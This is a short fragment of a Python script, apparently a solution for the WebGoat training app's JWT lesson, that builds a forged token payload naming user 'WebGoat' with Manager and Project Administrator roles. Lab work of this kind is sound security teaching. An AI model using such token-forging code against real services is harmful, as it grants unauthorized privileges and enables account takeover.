...
if __name__ == '__main__':
    ...
    #creating payload to create final webgoat user JWT
    payload_webgoat = '{"iss":"WebGoat Token Builder",\
            "iat":1524210904,"exp":1618905304,"aud":"webgoat.org",\
            "sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com",\
            "Role":["Manager","Project Administrator"]}'
    
    #converting payloads to json
    payload = json.loads(payload, object_pairs_hook=OrderedDict)
    payload_webgoat = json.loads(payload_webgoat, object_pairs_hook=OrderedDict)
